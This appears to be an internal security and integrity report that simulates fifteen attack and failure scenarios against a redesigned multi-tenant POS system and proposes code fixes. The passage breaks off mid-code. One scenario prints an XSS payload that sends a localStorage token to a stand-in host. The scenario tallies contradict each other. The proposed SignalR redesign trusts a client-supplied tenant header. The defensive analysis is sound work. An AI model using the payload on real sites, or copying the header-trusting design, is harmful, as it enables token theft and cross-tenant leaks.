# CHAOS SCENARIO SIMULATION REPORT — KasserPro POS

**Version:** 1.0  
**Date:** 2026-02-12  
**Classification:** Engineering Internal — Security & Integrity Analysis  
**Status:** CRITICAL — Redesigns Required  
**Baseline:** PRODUCTION_HARDENING_BLUEPRINT.md v1.0 (the "redesigned system")

---

## Table of Contents

1. [Simulation Parameters](#1-simulation-parameters)
2. [Scenario Matrix](#2-scenario-matrix)
3. [Detailed Scenario Execution](#3-detailed-scenario-execution)
4. [Verdict Summary](#4-verdict-summary)
5. [Surviving Vulnerabilities](#5-surviving-vulnerabilities)
6. [Subsystem Redesigns](#6-subsystem-redesigns)
7. [Updated Execution Waves](#7-updated-execution-waves)
8. [Final Risk Matrix](#8-final-risk-matrix)

---

## 1. Simulation Parameters

```
┌────────────────────────────────────────────────┐
│              CHAOS LABORATORY                  │
├────────────────────────────────────────────────┤
│  Tenants:    2 (TenantA, TenantB)              │
│  Branches:   3 (A1, A2, B1)                    │
│  Cashiers:   5 (C1@A1, C2@A1, C3@A2, C4@B1,   │
│              C5@B1)                             │
│  Products:   P1 (stock=3@A1), P2 (stock=100)   │
│  Network:    50% packet loss, 2s latency        │
│  Database:   SQLite single-file                │
│  Server:     Single instance, may restart       │
│  Attacker:   Has network access, may have       │
│              stolen Token-A (TenantA JWT)       │
│  Desktop:    2 bridges (D1@TenantA, D2@TenantB)│
└────────────────────────────────────────────────┘
```

**Analysis target:** The REDESIGNED system as described in `PRODUCTION_HARDENING_BLUEPRINT.md`. Each scenario is traced through the proposed code changes to determine if the system survives.

---

## 2. Scenario Matrix

| # | Scenario | Actors | Attack Vector | Survives? |
|---|----------|--------|---------------|-----------|
| S1 | Concurrent same-product sales | C1, C2 @ Branch A1 | Race condition | **❌ FAILS** |
| S2 | Cash register balance corruption | C1, C2, C3 | Concurrent writes | ⚠️ PARTIAL |
| S3 | Cross-tenant order cancellation | C4 (TenantB) → TenantA orders | Spoofed order ID | ✅ SURVIVES |
| S4 | Cross-tenant order item injection | C4 → TenantA draft | Spoofed order ID | ✅ SURVIVES |
| S5 | Branch header spoofing | C1 → Branch A2 | X-Branch-Id = A2 | ✅ SURVIVES |
| S6 | Network failure mid-payment | C1 | Disconnect between create+complete | **❌ FAILS** |
| S7 | Double-click payment | C1 | Rapid-fire clicks | **❌ FAILS** |
| S8 | Idempotency after restart | C1 | Server restart + retry | **❌ FAILS** |
| S9 | DeviceHub receipt eavesdrop | D2 (TenantB) | SignalR broadcast | **❌ FAILS** |
| S10 | DeviceHub connection spoof | Attacker | Random API key | ✅ SURVIVES |
| S11 | Stolen JWT cross-tenant | Attacker with Token-A | Forged TenantId | ✅ SURVIVES |
| S12 | Stolen JWT session hijack | Attacker with Token-A | Same tenant impersonation | **❌ FAILS** |
| S13 | XSS token extraction | Attacker | localStorage theft | **❌ FAILS** |
| S14 | Concurrent refund + sale | C1 refund, C2 sale | Same product, race | **❌ FAILS** |
| S15 | SQLite writer starvation | C1-C5 all completing | Write lock contention | ⚠️ DEGRADES |

**Result: 7 FAIL, 2 PARTIAL/DEGRADE, 6 SURVIVE**

---

## 3. Detailed Scenario Execution

### S1: TOCTOU Stock Race — ❌ FAILS

**Setup:** Product P1 has `BranchInventory.Quantity = 3` at Branch A1. `AllowNegativeStock = false`. Cashiers C1, C2 each sell 2x P1.

**Execution trace through REDESIGNED system:**

```
T0: P1@A1.Quantity = 3

T1: C1 → POST /api/orders (CreateAsync)
    └─ ARCH-05 fix reads BranchInventory: Quantity=3, requested=2
    └─ 3 >= 2 → PASS → Draft created (Order-101)

T2: C2 → POST /api/orders (CreateAsync)
    └─ ARCH-05 fix reads BranchInventory: Quantity=3, requested=2
    └─ 3 >= 2 → PASS → Draft created (Order-102)
    ⚠ STALE READ — stock not yet decremented

T3: C1 → POST /api/orders/101/complete (CompleteAsync)
    └─ BEGIN TRANSACTION
    └─ SaveChangesAsync (order status)
    └─ BatchDecrementStockAsync: Quantity 3→1
    └─ RecordTransactionAsync(Sale, ...)
    └─ COMMIT ✓

T4: C2 → POST /api/orders/102/complete (CompleteAsync)
    └─ BEGIN TRANSACTION
    └─ SaveChangesAsync (order status)
    └─ BatchDecrementStockAsync: Quantity 1→-1
    └─ ⚠ Blueprint ARCH-05 only LOGS warning, does NOT reject!
    └─ RecordTransactionAsync(Sale, ...)
    └─ COMMIT ✓ ← STOCK IS NOW -1

RESULT: NEGATIVE STOCK DESPITE AllowNegativeStock=false
```

**Root cause:** Time-of-Check (CreateAsync) ≠ Time-of-Use (CompleteAsync). The blueprint's ARCH-05 fix moves the CHECK to `BranchInventory` but doesn't add a RECHECK inside `CompleteAsync`. The guard in `BatchDecrementStockAsync` logs but doesn't reject.

**Evidence — ARCH-05 proposed guard in `BatchDecrementStockAsync`:**
```csharp
if (inventory.Quantity < quantity)
{
    _logger.LogWarning(...);  // ← LOG, NOT REJECT
    // "Proceed based on tenant configuration"
}
inventory.Quantity -= quantity;  // ← STILL DECREMENTS
```

---

### S2: Cash Register Balance Corruption — ⚠️ PARTIAL

**Setup:** Branch A1 balance = 1000 EGP. C1 sells 100, C2 sells 200 simultaneously.

**Execution trace through REDESIGNED system:**

```
T0: CashRegister@A1.Balance = 1000

T1: C1 → CompleteAsync → BEGIN TRANSACTION (SQLite write lock acquired)
T2: C2 → CompleteAsync → BEGIN TRANSACTION → ⏳ BLOCKED (SQLite single-writer)

T3: C1 → RecordTransactionAsync → reads balance=1000 → writes 1100
T4: C1 → COMMIT → SQLite lock released

T5: C2 → SQLite lock acquired → RecordTransactionAsync → reads balance=1100 → writes 1300
T6: C2 → COMMIT ✓

RESULT: Balance = 1300 ✓ (correct — SQLite's single-writer serializes)
```

**But with the standalone API path:**

```
T0: Balance = 1000

T1: Admin → POST /api/cash-register/deposit (CreateTransactionAsync)
    └─ BEGIN TRANSACTION → reads 1000

T2: C1 → CompleteAsync → BEGIN TRANSACTION → ⏳ BLOCKED

T3: Admin → writes balance=1500 → COMMIT

T4: C1 → unblocked → RecordTransactionAsync (inside CompleteAsync tx)
    └─ reads balance=1500 → writes 1600
    └─ COMMIT ✓

RESULT: Correct. SQLite serialization saves us.
```

**Verdict:** The serialization happens ACCIDENTALLY because SQLite only allows one writer. If the system migrated to PostgreSQL/SQL Server (multi-writer), the race condition would REAPPEAR because the blueprint's ARCH-03 fix depends on `HasActiveTransaction` which doesn't exist yet, and the concurrent-writer scenario isn't handled.

**Rating:** ⚠️ PARTIAL — correct on SQLite by accident, breaks on migration.

---

### S3: Cross-Tenant Order Cancellation — ✅ SURVIVES

**Setup:** C4 (TenantB, Branch B1) attempts to cancel Order-101 (TenantA).

**Execution trace through REDESIGNED system:**

```
T1: C4 → POST /api/orders/101/cancel
    └─ REM-06 fix: CancelAsync now queries with TenantId filter
    └─ Query: WHERE Id=101 AND TenantId=2 (TenantB)
    └─ Order-101 has TenantId=1 → NOT FOUND
    └─ ARCH-01: Global query filter also blocks: TenantId==2 → order invisible
    └─ Return 404

RESULT: ✅ Double protection (service filter + global query filter)
```

---

### S4: Cross-Tenant Item Injection — ✅ SURVIVES

**Setup:** C4 (TenantB) attempts `POST /api/orders/101/items`.

```
T1: C4 → AddItemAsync(orderId=101)
    └─ REM-06 fix: query includes TenantId filter
    └─ ARCH-01: Global filter WHERE TenantId==2 → Order-101 invisible
    └─ Return 404

RESULT: ✅ SURVIVES
```

---

### S5: Branch Header Spoofing — ✅ SURVIVES

**Setup:** C1 (TenantA, Branch A1, Role=Cashier) sets `X-Branch-Id: A2`.

```
T1: C1 → GET /api/orders (with X-Branch-Id=2)
    └─ REM-10 fix: CurrentUserService checks role
    └─ Role=Cashier, JWT branchId=1, header=2
    └─ 2 ≠ 1 AND role≠Admin → falls back to JWT branchId=1
    └─ Returns only Branch A1 data

RESULT: ✅ SURVIVES
```

---

### S6: Network Failure Mid-Payment — ❌ FAILS (with atomic endpoint too)

**Setup:** C1 clicks Pay. Network drops during HTTP response.

**Current two-step flow (even with ARCH-04 atomic endpoint):**

```
T1: C1 → POST /api/orders/create-and-complete
    └─ Server: BEGIN TRANSACTION
    └─ CreateAsyncInternal ✓
    └─ CompleteAsyncInternal ✓
    └─ COMMIT ✓
    └─ HTTP 200 Response ───╳─── NETWORK DROP
    └─ Client: timeout/error

T2: Client shows error toast → user panics
T3: User clicks Pay AGAIN
T4: ARCH-02 idempotency enforcement...
    └─ BUT: the idempotency key was generated INSIDE RTK Query's `query` fn
    └─ New call = new crypto.randomUUID() = NEW KEY
    └─ Server processes as NEW order ← DUPLICATE!

RESULT: Order completed TWICE. Customer charged double.
```

**Root cause 1:** Idempotency key generated per RTK Query invocation, not per user action.
**Root cause 2:** Client cannot distinguish "server processed but response lost" from "server never received."

---

### S7: Double-Click Payment — ❌ FAILS

**Setup:** C1 double-clicks "اتمام الدفع" button within 50ms.

```
T1: Click 1 → PaymentModal.handleComplete()
    └─ createAndCompleteOrder mutation called
    └─ RTK Query `query` fn: idempotencyKey = crypto.randomUUID() → "key-A"

T2: Click 2 → PaymentModal.handleComplete() (50ms later)
    └─ createAndCompleteOrder mutation called AGAIN
    └─ RTK Query `query` fn: idempotencyKey = crypto.randomUUID() → "key-B"

T3: Server receives POST with key-A → processes order
T4: Server receives POST with key-B → processes ANOTHER order

RESULT: TWO identical orders created. Customer charged twice.
```

**Evidence — Blueprint ARCH-02 proposed ordersApi.ts:**
```typescript
createOrder: builder.mutation<...>({
  query: (order) => {
    const idempotencyKey = crypto.randomUUID(); // ← NEW KEY PER CALL
    return { ..., headers: { "Idempotency-Key": idempotencyKey } };
  },
})
```

The `query` function executes independently for each mutation invocation. Two clicks = two UUIDs = two valid orders.

---

### S8: Idempotency After Server Restart — ❌ FAILS

**Setup:** C1 submits order. Server restarts. C1 retries (or navigates back and clicks Pay).

```
T1: C1 → POST /api/orders/create-and-complete
    └─ Idempotency-Key: "key-X"
    └─ Server processes, stores key-X in IMemoryCache
    └─ Response: 200 OK

T2: Server crashes and restarts
    └─ IMemoryCache cleared (in-memory = volatile)

T3: C1 → POST /api/orders/create-and-complete
    └─ Idempotency-Key: "key-X" (same key)
    └─ Server: cache miss → processes as NEW request
    └─ DUPLICATE order created

RESULT: Idempotency protection lost on restart.
```

**Evidence — Blueprint ARCH-02 server-side uses `IMemoryCache`:**
```csharp
// Current IdempotencyMiddleware.cs line 60:
if (_cache.TryGetValue(cacheKey, out CachedResponse? cachedResponse))
```
Blueprint doesn't change the storage backend. `IMemoryCache` is process-local and volatile.

---

### S9: DeviceHub Receipt Eavesdrop — ❌ FAILS

**Setup:** D1 (TenantA desktop) and D2 (TenantB desktop) both connected to DeviceHub. C1 (TenantA) completes a sale.

```
T1: C1 → POST /api/orders/101/complete → success
    └─ OrdersController.cs line 152:
    └─ await _hubContext.Clients.All.SendAsync("PrintReceipt", printCommand);

T2: printCommand contains:
    {
      Receipt: {
        ReceiptNumber: "ORD-20260212-A3F21B",
        BranchName: "فرع المعادي",           ← TenantA data
        Items: [{name: "لحم بقري", qty: 2}], ← TenantA products
        TotalAmount: 450.00,                  ← TenantA financials
        CashierName: "أحمد محمد",             ← TenantA staff
        CustomerName: "محمد علي"              ← TenantA customer
      }
    }

T3: D1 (TenantA) receives PrintReceipt → prints receipt ✓
T4: D2 (TenantB) receives PrintReceipt → SEES TenantA's full receipt data ✗

RESULT: CROSS-TENANT DATA LEAK via SignalR broadcast.
```

**Evidence — OrdersController.cs line 152:**
```csharp
await _hubContext.Clients.All.SendAsync("PrintReceipt", printCommand);
// Clients.All = EVERY connected device, ALL tenants
```

The blueprint's REM-11 fixes API key validation (preventing anonymous connections) but does NOT change the broadcast target from `Clients.All` to group-based routing.

---

### S10: DeviceHub Connection Spoof — ✅ SURVIVES

**Setup:** Attacker sends random API key to hub.

```
T1: Attacker → WebSocket /hubs/device
    └─ X-API-Key: "random-guess"
    └─ REM-11 fix: apiKey != expectedKey
    └─ Connection rejected ✓

RESULT: ✅ SURVIVES (if API key is cryptographically strong)
```

---

### S11: Stolen JWT Cross-Tenant — ✅ SURVIVES

**Setup:** Attacker steals Token-A (TenantA JWT) and modifies `tenantId` claim.

```
T1: Attacker modifies JWT payload: tenantId=2 (TenantB)
    └─ REM-01 fix: JWT signed with secret ≥32 chars from env var
    └─ Modified token → signature invalid
    └─ Server validates signature → 401 Unauthorized

RESULT: ✅ Cannot modify claims without key.
```

---

### S12: Stolen JWT Session Hijack — ❌ FAILS

**Setup:** Attacker steals Token-A (TenantA JWT, valid, unmodified) via network interception or XSS. Uses it from different IP/device.

```
T1: Attacker → GET /api/orders (with stolen Token-A)
    └─ JWT signature valid ✓
    └─ No IP binding ✗
    └─ No device fingerprint ✗
    └─ No session tracking ✗
    └─ Server: "Welcome, Ahmed@TenantA"

T2: Attacker → POST /api/orders/create-and-complete
    └─ All auth checks pass
    └─ Order created on TenantA's behalf

T3: Legitimate user detects compromise → wants to revoke token
    └─ NO REVOCATION MECHANISM
    └─ Token valid for remaining 24h

RESULT: Full TenantA access for up to 24 hours. No revocation.
```

---

### S13: XSS Token Extraction — ❌ FAILS

**Setup:** Attacker injects JS via product name or any unescaped field. TypeScript `strict: false` means no compile-time null/type safety.

```
T1: Attacker creates product: name = "<script>fetch('evil.com?t='+localStorage.token)</script>"
    └─ If rendered without sanitization → executes

T2: Script accesses localStorage:
    └─ Blueprint: no change to token storage mechanism
    └─ redux-persist stores auth.token in localStorage
    └─ Token extracted and sent to attacker

T3: → Escalates to S12 (stolen JWT hijack)

RESULT: Token theft via XSS. Blueprint doesn't address token storage.
```

**Evidence — store/index.ts:**
```typescript
const persistConfig = {
  key: 'root',
  storage,  // ← localStorage
  whitelist: ['auth', ...],
};
```

---

### S14: Concurrent Refund + Sale — ❌ FAILS

**Setup:** C1 refunds Order-101 (2x P1). C2 simultaneously sells 2x P1. Stock P1@A1 = 1.

```
T0: P1@A1.Quantity = 1

T1: C1 → RefundAsync(orderId=101)
    └─ BEGIN TRANSACTION → SQLite write lock acquired
    └─ IncrementStockAsync: 1+2 = 3
    └─ RecordTransactionAsync(Refund, ...)

T2: C2 → CompleteAsync(orderId=102)
    └─ BEGIN TRANSACTION → ⏳ BLOCKED

T3: C1 → COMMIT ✓ → stock = 3

T4: C2 → unblocked
    └─ BatchDecrementStockAsync: reads Quantity=3, decrements to 1
    └─ RecordTransactionAsync(Sale, ...)
    └─ COMMIT ✓

RESULT: ✅ Correct on SQLite (serialized via write lock)
```

BUT: The stock CHECK happened at T-minus-30s during CreateAsync when stock was 1 and C2 requested 2. At that time, 1 < 2 should have been rejected! Unless stock was 2+ at CreateAsync time...

Let me re-trace with correct timeline:

```
T0: P1@A1.Quantity = 1

T1: C2 → CreateAsync → reads BranchInventory.Quantity=1, wants 2
    └─ 1 < 2 → REJECTED (if AllowNegativeStock=false)
```

OK this is fine — CreateAsync would have caught it. But what if stock was 2?

```
T0: P1@A1.Quantity = 2

T1: C2 → CreateAsync → reads Quantity=2, wants 2 → PASS (Draft created)
T2: C1 → RefundAsync → IncrementStockAsync not yet called
T3: Meanwhile someone else completes an order → stock 2→0
T4: C2 → CompleteAsync → BatchDecrementStockAsync: 0-2 = -2 ← NEGATIVE!
```

**RESULT: The TOCTOU vulnerability from S1 applies to EVERY stock-dependent scenario.** Refund doesn't make it worse, but the fundamental problem persists.

---

### S15: SQLite Writer Starvation — ⚠️ DEGRADES

**Setup:** All 5 cashiers completing orders simultaneously.

```
T1: C1 → CompleteAsync → BEGIN TRANSACTION → lock acquired (est. 50-200ms)
T2: C2 → CompleteAsync → BLOCKED
T3: C3 → CompleteAsync → BLOCKED
T4: C4 → CompleteAsync → BLOCKED
T5: C5 → CompleteAsync → BLOCKED

T6: C1 COMMIT → C2 unblocked (FIFO)
T7: C2 processes → COMMIT → C3 unblocked
...

Total sequential time: 5 × 150ms avg = 750ms
```

**Worst case with network latency (2s timeout per request):**

```
C5 waits: 4 × 150ms = 600ms + own processing
Total: ~750ms → within timeout ✓
BUT: Under heavy load (20+ concurrent), wait time exceeds client timeout.
```

**Rating:** ⚠️ Functions correctly at 5 cashiers. Degrades beyond ~10 concurrent writers.

---

## 4. Verdict Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    CHAOS SIMULATION VERDICT                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   Scenarios Tested:        15                                   │
│   ✅ Full Survival:         6  (S3, S4, S5, S10, S11, S14*)    │
│   ⚠️ Partial/Degrades:     2  (S2, S15)                        │
│   ❌ System Breaks:         7  (S1, S6, S7, S8, S9, S12, S13)  │
│                                                                 │
│   * S14 survives on SQLite only, fails on multi-writer DBs     │
│                                                                 │
│   OVERALL: REDESIGNED SYSTEM DOES NOT SURVIVE CHAOS            │
│                                                                 │
│   Critical Failures That Cause Financial Loss:                  │
│     • S1: Negative stock → product sold without inventory       │
│     • S6: Duplicate order after network failure                 │
│     • S7: Duplicate order from double-click                     │
│     • S8: Duplicate order after server restart                  │
│                                                                 │
│   Critical Failures That Cause Data Leak:                       │
│     • S9:  Receipt data crosses tenant boundary                 │
│     • S12: Stolen token gives full access, no revocation        │
│     • S13: XSS extracts token from localStorage                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5. Surviving Vulnerabilities

### SV-01: TOCTOU Stock Race Condition [S1, S14]

**Breaks:** Data corruption, negative stock  
**Severity:** CRITICAL  
**Blueprint gap:** ARCH-05 moves validation to BranchInventory but leaves a time gap between CreateAsync (check) and CompleteAsync (decrement). The guard in `BatchDecrementStockAsync` LOGS but doesn't REJECT.

### SV-02: Idempotency Key Per-Invocation [S6, S7]

**Breaks:** Duplicate financial entries  
**Severity:** CRITICAL  
**Blueprint gap:** ARCH-02 generates `crypto.randomUUID()` inside RTK Query's `query` function. Each mutation call gets a new key. Network retry after lost response or double-click creates a new key, bypassing idempotency entirely.

### SV-03: In-Memory Idempotency Cache [S8]

**Breaks:** Duplicate financial entries after restart  
**Severity:** HIGH  
**Blueprint gap:** ARCH-02 doesn't change the `IMemoryCache` backend. Process restart = all keys lost. SQLite table needed.

### SV-04: SignalR Cross-Tenant Broadcast [S9]

**Breaks:** Cross-tenant data leak  
**Severity:** CRITICAL  
**Blueprint gap:** REM-11 validates the API key but `Clients.All.SendAsync("PrintReceipt", ...)` in `OrdersController.cs:152` broadcasts full receipt data (customer names, amounts, products) to EVERY connected device.

### SV-05: No JWT Token Revocation [S12]

**Breaks:** Unauthorized access for up to 24h  
**Severity:** HIGH  
**Blueprint gap:** REM-01 externalizes the key but doesn't add token revocation, refresh tokens, or session binding. A stolen token = 24h of unrestricted access.

### SV-06: Token in localStorage [S13]

**Breaks:** Token theft via XSS  
**Severity:** HIGH  
**Blueprint gap:** No change to token storage. With `strict: false` and user-controlled data (product names, customer names) rendered in React, XSS is plausible.

### SV-07: No UI Debounce on Payment [S7]

**Breaks:** Duplicate orders  
**Severity:** HIGH  
**Blueprint gap:** PaymentModal has no click debounce, no loading state that disables the button, no optimistic UI lock. Even with correct idempotency, the UX allows confusion.

### SV-08: HasActiveTransaction Missing [Blueprint dependency]

**Breaks:** Nested transaction detection  
**Severity:** MEDIUM  
**Blueprint gap:** ARCH-03 requires `_unitOfWork.HasActiveTransaction` but `IUnitOfWork` doesn't define it. Without it, `RecordTransactionAsync` can't detect whether to create its own transaction.

### SV-09: SQLite Single-Writer Bottleneck [S15]

**Breaks:** Performance degradation  
**Severity:** MEDIUM  
**Blueprint gap:** Not addressed as a scalability concern. Correct for ≤5 concurrent cashiers, degrades beyond 10.

---

## 6. Subsystem Redesigns

### REDESIGN-01: Stock Validation Inside CompleteAsync (fixes SV-01)

**Architectural principle:** Validate at point-of-use, not point-of-intent. Stock check must happen INSIDE the write transaction that decrements stock.

**Design:**

```
┌──────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  CreateAsync  │────>│  CompleteAsync    │────>│ BatchDecrement   │
│  (soft check) │     │  (HARD check +   │     │ (atomic inside   │
│  UX hint only │     │   reject if <0)  │     │  same tx)        │
└──────────────┘     └──────────────────┘     └──────────────────┘
```

**File to modify:** `src/KasserPro.Application/Services/Implementations/OrderService.cs`

**Code pattern — inside CompleteAsync, BEFORE BatchDecrementStockAsync:**
```csharp
// INSIDE CompleteAsync's transaction, AFTER SaveChangesAsync for order status,
// BEFORE calling BatchDecrementStockAsync:

// Re-validate stock inside write transaction (point-of-use check)
var tenant = await _unitOfWork.Tenants.GetByIdAsync(_currentUser.TenantId);
if (tenant != null && !tenant.AllowNegativeStock)
{
    foreach (var item in order.Items.Where(i => i.ProductId > 0))
    {
        var product = await _unitOfWork.Products.GetByIdAsync(item.ProductId);
        if (product != null && product.TrackInventory)
        {
            var availableQty = await _inventoryService
                .GetAvailableQuantityAsync(item.ProductId, _currentUser.BranchId);
            if (availableQty < item.Quantity)
            {
                await transaction.RollbackAsync();
                return ApiResponse<OrderDto>.Fail(ErrorCodes.INSUFFICIENT_STOCK,
                    $"المخزون تغير أثناء إتمام الطلب. المنتج: {item.ProductName}. " +
                    $"المتاح: {availableQty}، المطلوب: {item.Quantity}");
            }
        }
    }
}
```

**File to modify:** `src/KasserPro.Infrastructure/Services/InventoryService.cs`

**Code pattern — BatchDecrementStockAsync hard rejection:**
```csharp
// REPLACE the warning-only guard with a hard reject:
if (inventory.Quantity < quantity)
{
    throw new InvalidOperationException(
        $"Stock insufficient for Product {productId} at Branch {branchId}: " +
        $"available={inventory.Quantity}, requested={quantity}");
}
```

**Why both checks?**
1. CreateAsync soft-check = UX feedback ("not enough stock, don't bother paying")
2. CompleteAsync hard-check = integrity guarantee ("confirmed under write lock")
3. BatchDecrement exception = defense-in-depth ("impossible state → abort")

**Required tests:**
- `Complete_StockDepletedBetweenCreateAndComplete_Returns409`
- `Complete_ConcurrentSales_OnlyOneSucceeds_WhenStockInsufficient`
- `BatchDecrement_NegativeResult_ThrowsIfDisallowed`

---

### REDESIGN-02: Component-Level Idempotency Keys (fixes SV-02)

**Architectural principle:** Idempotency key = one per USER ACTION, generated BEFORE the API call, stable across retries and re-calls.

**Design:**

```
┌──────────────────┐     ┌──────────────────┐     ┌──────────┐
│  PaymentModal    │     │   ordersApi.ts   │     │  Server  │
│  onClick:        │     │  mutation:       │     │          │
│  key=UUID()      │────>│  uses passed key │────>│  checks  │
│  setSubmitting() │     │  (not generated) │     │  cache   │
└──────────────────┘     └──────────────────┘     └──────────┘
        │
        └─── key generated ONCE per click
             stable across retries
             button disabled until response
```

**File to modify:** `client/src/components/pos/PaymentModal.tsx`

**Code pattern:**
```tsx
const [isSubmitting, setIsSubmitting] = useState(false);
const idempotencyKeyRef = useRef<string | null>(null);

const handleComplete = async () => {
  // Prevent double-click
  if (isSubmitting) return;
  setIsSubmitting(true);

  // Generate key ONCE per user action
  if (!idempotencyKeyRef.current) {
    idempotencyKeyRef.current = crypto.randomUUID();
  }
  const idempotencyKey = idempotencyKeyRef.current;

  try {
    const result = await createAndCompleteOrder({
      order: { items, customerId, ... },
      payment: { payments: [{ method: selectedMethod, amount: numericAmount }] },
      idempotencyKey,  // passed to the mutation
    }).unwrap();

    // Success — reset key for next potential action
    idempotencyKeyRef.current = null;
    onOrderComplete?.();
    onClose();
  } catch (error) {
    // Key preserved — same key will be used on retry
    toast.error("حدث خطأ. يمكنك المحاولة مرة أخرى.");
  } finally {
    setIsSubmitting(false);
  }
};

// In JSX:
<button 
  onClick={handleComplete} 
  disabled={isSubmitting}
  className={isSubmitting ? "opacity-50 cursor-not-allowed" : ""}
>
  {isSubmitting ? "جاري المعالجة..." : "اتمام الدفع"}
</button>
```

**File to modify:** `client/src/api/ordersApi.ts`

**Code pattern:**
```typescript
createAndCompleteOrder: builder.mutation<
  ApiResponse<Order>,
  CreateAndCompleteOrderRequest & { idempotencyKey: string }
>({
  query: ({ idempotencyKey, ...body }) => ({
    url: "/orders/create-and-complete",
    method: "POST",
    body,
    headers: { "Idempotency-Key": idempotencyKey },
  }),
  invalidatesTags: [{ type: "Orders", id: "LIST" }, "Shifts"],
}),
```

**Key design decisions:**
1. `useRef` not `useState` — ref doesn't trigger re-render, persists across re-renders
2. Key generated on FIRST click, preserved on error, reset on success
3. `isSubmitting` state disables button visually AND functionally
4. Key passed FROM component TO RTK Query (not generated inside `query` fn)

**Required tests:**
- Double-click: second click returns immediately (isSubmitting guard)
- Network failure + retry: same idempotency key sent
- Success + new order: new key generated

---

### REDESIGN-03: Database-Backed Idempotency (fixes SV-03)

**Architectural principle:** Idempotency state must survive process restarts. SQLite table is the source of truth, not in-memory cache.

**Design:**

```
┌─────────┐     ┌──────────────┐     ┌──────────┐
│ Request │────>│ Middleware:   │────>│ SQLite   │
│ + Key   │     │ Check table  │     │ Table:   │
│         │     │ Insert if new│     │ Idempot. │
│         │     │ Return cached│     │ Keys     │
└─────────┘     └──────────────┘     └──────────┘
```

**New file:** `src/KasserPro.Domain/Entities/IdempotencyRecord.cs`

```csharp
namespace KasserPro.Domain.Entities;

public class IdempotencyRecord
{
    public int Id { get; set; }
    public string CacheKey { get; set; } = string.Empty;  // {tenantId}:{userId}:{key}
    public int StatusCode { get; set; }
    public string ContentType { get; set; } = "application/json";
    public string ResponseBody { get; set; } = string.Empty;
    public DateTime CreatedAtUtc { get; set; }
    public DateTime ExpiresAtUtc { get; set; }
}
```

**Add to AppDbContext:**
```csharp
public DbSet<IdempotencyRecord> IdempotencyRecords { get; set; }

// In OnModelCreating:
modelBuilder.Entity<IdempotencyRecord>(entity =>
{
    entity.HasIndex(e => e.CacheKey).IsUnique();
    entity.HasIndex(e => e.ExpiresAtUtc);  // for cleanup
});
```

**Rewrite — IdempotencyMiddleware.cs:**
```csharp
public async Task InvokeAsync(HttpContext context)
{
    // ... existing path/method checks ...

    var idempotencyKey = context.Request.Headers["Idempotency-Key"].FirstOrDefault();

    if (string.IsNullOrEmpty(idempotencyKey))
    {
        context.Response.StatusCode = 400;
        await context.Response.WriteAsJsonAsync(
            ApiResponse<object>.Fail("Idempotency-Key header required"));
        return;
    }

    var userId = context.User?.FindFirst("userId")?.Value ?? "0";
    var tenantId = context.User?.FindFirst("tenantId")?.Value ?? "0";
    var cacheKey = $"idempotency:{tenantId}:{userId}:{idempotencyKey}";

    // Check database
    var dbContext = context.RequestServices.GetRequiredService<AppDbContext>();
    var existing = await dbContext.IdempotencyRecords
        .FirstOrDefaultAsync(r => r.CacheKey == cacheKey && r.ExpiresAtUtc > DateTime.UtcNow);

    if (existing != null)
    {
        context.Response.StatusCode = existing.StatusCode;
        context.Response.ContentType = existing.ContentType;
        context.Response.Headers.Append("X-Idempotency-Replayed", "true");
        await context.Response.WriteAsync(existing.ResponseBody);
        return;
    }

    // Capture response
    var originalBodyStream = context.Response.Body;
    using var responseBody = new MemoryStream();
    context.Response.Body = responseBody;

    await _next(context);

    if (context.Response.StatusCode >= 200 && context.Response.StatusCode < 300)
    {
        responseBody.Seek(0, SeekOrigin.Begin);
        var responseText = await new StreamReader(responseBody).ReadToEndAsync();

        var record = new IdempotencyRecord
        {
            CacheKey = cacheKey,
            StatusCode = context.Response.StatusCode,
            ContentType = context.Response.ContentType ?? "application/json",
            ResponseBody = responseText,
            CreatedAtUtc = DateTime.UtcNow,
            ExpiresAtUtc = DateTime.UtcNow.AddHours(24)
        };

        try
        {
            dbContext.IdempotencyRecords.Add(record);
            await dbContext.SaveChangesAsync();
        }
        catch (DbUpdateException)
        {
            // Unique constraint violation = concurrent insert, safe to ignore
        }
    }

    responseBody.Seek(0, SeekOrigin.Begin);
    await responseBody.CopyToAsync(originalBodyStream);
}
```

**Cleanup job (add to Program.cs or background service):**
```csharp
// Run periodically to clean expired keys
await dbContext.IdempotencyRecords
    .Where(r => r.ExpiresAtUtc < DateTime.UtcNow)
    .ExecuteDeleteAsync();
```

**Migration required:** `AddIdempotencyRecordsTable`

**Required tests:**
- `Idempotency_DuplicateKey_ReturnsCached_AfterRestart`
- `Idempotency_ExpiredKey_ProcessesNewly`
- `Idempotency_ConcurrentInsert_NoException`

---

### REDESIGN-04: Tenant-Scoped SignalR Groups (fixes SV-04)

**Architectural principle:** Each tenant's devices form a SignalR group. Messages route to the correct group only.

**Design:**

```
                    ┌─────────────────┐
  D1@TenantA ────> │   DeviceHub     │
                   │ Group: tenant-1 │ ──> PrintReceipt → D1 only
  D2@TenantB ────> │ Group: tenant-2 │
                   └─────────────────┘
```

**File to modify:** `src/KasserPro.API/Hubs/DeviceHub.cs`

**Code pattern:**
```csharp
public class DeviceHub : Hub
{
    private readonly ILogger<DeviceHub> _logger;
    private static readonly Dictionary<string, DeviceInfo> _deviceConnections = new();

    public override async Task OnConnectedAsync()
    {
        var httpContext = Context.GetHttpContext()!;
        var apiKey = httpContext.Request.Headers["X-API-Key"].ToString();
        var deviceId = httpContext.Request.Headers["X-Device-Id"].ToString();
        var tenantId = httpContext.Request.Headers["X-Tenant-Id"].ToString();

        // Validate API key (REM-11)
        var expectedKey = httpContext.RequestServices
            .GetRequiredService<IConfiguration>()["DeviceHub:ApiKey"];
        if (string.IsNullOrEmpty(apiKey) || apiKey != expectedKey)
        {
            Context.Abort();
            return;
        }

        if (string.IsNullOrEmpty(deviceId) || string.IsNullOrEmpty(tenantId))
        {
            Context.Abort();
            return;
        }

        // Add connection to tenant group
        await Groups.AddToGroupAsync(Context.ConnectionId, $"tenant-{tenantId}");

        lock (_deviceConnections)
        {
            _deviceConnections[deviceId] = new DeviceInfo
            {
                ConnectionId = Context.ConnectionId,
                TenantId = tenantId,
                DeviceId = deviceId
            };
        }

        await base.OnConnectedAsync();
    }

    public override async Task OnDisconnectedAsync(Exception? exception)
    {
        var httpContext = Context.GetHttpContext();
        var deviceId = httpContext?.Request.Headers["X-Device-Id"].ToString();
        if (!string.IsNullOrEmpty(deviceId))
        {
